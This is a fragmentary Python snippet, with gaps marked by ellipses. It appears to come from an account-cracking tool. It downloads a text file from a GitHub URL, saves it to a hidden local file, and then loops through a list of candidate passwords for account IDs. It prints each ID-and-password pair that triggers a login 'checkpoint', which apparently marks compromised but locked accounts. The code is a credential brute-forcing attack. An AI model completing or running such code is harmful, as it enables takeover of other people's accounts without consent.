...
try:
    url_proxy = random.choice([
              "https://github.com/PIKSO404/PAID/blob/main/PAID.txt",
])
except:pass
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/PIKSO404/PAID/blob/main/PAID.txt').text
		ua=open('.Aprl.txt','w')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[38;5;206m [ANS-CP] {idf}  {pw} {N}')     
